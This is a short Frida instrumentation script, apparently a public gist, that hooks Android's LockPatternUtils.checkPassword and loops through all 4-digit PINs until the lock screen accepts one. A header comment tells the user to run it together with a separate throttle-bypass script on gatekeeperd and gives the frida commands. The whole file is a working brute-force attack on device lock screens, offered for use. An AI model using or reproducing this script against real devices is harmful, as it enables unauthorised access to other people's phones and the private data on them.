
/*
* Script created to bruteforce pin code with Frida
* Just type a random pin code with the bypass_throttle_script and this script launched
*
* /!\ Warning /!\
* Use it with : https://gist.github.com/Areizen/84be48ce9646185a9d2ecffb3a664a3
* 
* if you use it without you will lock your device
* frida -U -l bypass-throttle.js gatekeeperd
* frida -U -l systemui.js com.android.systemui 
*/
var pin = 0
var max_pin = 9999;
var pin_len = 4;

function pad(num, size) {
    var s = num+"";
    while (s.length < size) s = "0" + s;
    return s;
}

Java.perform(function(){

    const LockPatternUtils = Java.use("com.android.internal.widget.LockPatternUtils")


    LockPatternUtils.checkPassword.overload('java.lang.String', 'int', 'com.android.internal.widget.LockPatternUtils$CheckCredentialProgressCallback').implementation = function(password, userId, callback){
        
        while (pin < max_pin){
            
            console.log("Trying : " + pad(pin,pin_len));

            var result = this.checkPassword(pad(pin++,pin_len), userId, callback);
            
            if(result){
                console.log("Pin found : " + (pin-1));
                break;
            }
        }
        return result;
    }
})